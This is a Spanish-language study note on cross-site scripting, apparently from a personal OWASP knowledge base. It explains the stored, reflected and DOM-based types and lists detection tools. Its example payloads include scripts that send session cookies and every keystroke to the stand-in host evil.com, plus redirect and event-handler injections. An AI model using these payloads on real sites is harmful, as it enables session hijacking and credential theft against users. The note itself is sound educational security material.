---

---
-----
- Tags: #OWASP #javascript
-------
## ¿Qué es?

> Una vulnerabilidad **XSS** (**Cross-Site Scripting**) es un tipo de vulnerabilidad de seguridad informática que permite a un atacante ejecutar código malicioso en la página web de un usuario sin su conocimiento o consentimiento. Esta vulnerabilidad permite al atacante robar información personal, como nombres de usuario, contraseñas y otros datos confidenciales.

## ¿Cómo funciona?

1. Un atacante **inyecta** un script malicioso en una página web vulnerable.  
2. Cuando un usuario visita la página, el navegador ejecuta el código sin validar su origen.  
3. El script puede realizar acciones como:

- **Robar cookies de sesión** (`document.cookie`)
- **Capturar entradas del teclado** (`addEventListener('keypress', ...)`)
- **Redirigir a sitios maliciosos** (`window.location = 'http://evil.com'`)
- **Modificar contenido de la página** (`document.body.innerHTML = ...`)

## Tipos de XSS

### 🔹 **1. Stored XSS (Persistente)**

> El código malicioso se **almacena** en la aplicación (base de datos, archivos, etc.) y se ejecuta cuando un usuario accede a la página afectada.

Ejemplo: Un atacante publica un comentario malicioso en un foro:

```JavaScript
<script>fetch('http://evil.com/cookie?c=' + document.cookie)</script>
```

Cada usuario que vea el comentario ejecutará el script.

-----

### 🔹 **2. Reflected XSS (No Persistente)**

> El código malicioso **no se almacena** en la aplicación, sino que se refleja en la respuesta HTTP.

Ejemplo: Un sitio vulnerable usa el parámetro `q` en la URL sin sanitización:

```PHP
https://victima.com/search?q=<script>alert(1)</script>
```

Si la aplicación inserta el parámetro en el HTML sin escaparlo, el navegador ejecutará el `<script>`.

----

### 🔹 **3. DOM-Based XSS**

> La inyección ocurre en el **DOM** del navegador y no en la respuesta del servidor.

Ejemplo:

```html
<script> 
	var userInput = location.hash.substring(1); 
	document.write("<h1>" + userInput + "</h1>"); 
</script>
```

Si el usuario accede a `https://victima.com/#<script>alert(1)</script>` El navegador ejecutará el `alert(1)`.

## **Ejemplos de Payloads XSS**

📌 **Ejemplo de alerta simple:**

```html
<script>alert('XSS')</script>
```

📌 **Robar cookies de sesión:**

```html
<script>fetch('http://evil.com?cookie=' + document.cookie)</script>
```

📌 **Redirigir a un sitio malicioso:**

```html
<script>window.location='http://evil.com'</script>
```

📌 **Capturar credenciales con un keylogger:**

```html
<script> 
	document.onkeypress = function(e) { 
		fetch('http://evil.com/log?key=' + e.key); 
	}; 
</script>
```

📌 **Inyección en eventos (ejemplo en atributos HTML):**

```html
<img src="x" onerror="alert('XSS')">
```

📌 **Inyección en formularios:**

```html
<input type="text" value="XSS" onfocus="alert('XSS')">
```

📌 **Ejemplo en aplicaciones vulnerables a XSS en JavaScript:**

```javascript
document.write("<h1>" + userInput + "</h1>"); // Vulnerable si userInput no se escapa
```

----

## **Herramientas para detectar XSS**

🛠 **1. Burp Suite**

- Permite interceptar y modificar peticiones para probar XSS manualmente.  
    🔗 Burp Suite

🛠 **2. XSS Hunter**

- Plataforma para detectar XSS en aplicaciones web.  
    🔗 [XSS Hunter](https://xsshunter.com/)

🛠 **3. XSStrike**

- Herramienta automatizada para encontrar y explotar XSS.  
    🔗 [XSStrike en GitHub](https://github.com/s0md3v/XSStrike)

🛠 **4. OWASP ZAP**

- Escáner de seguridad con detección de XSS.  
    🔗 [OWASP ZAP](https://www.zaproxy.org/)

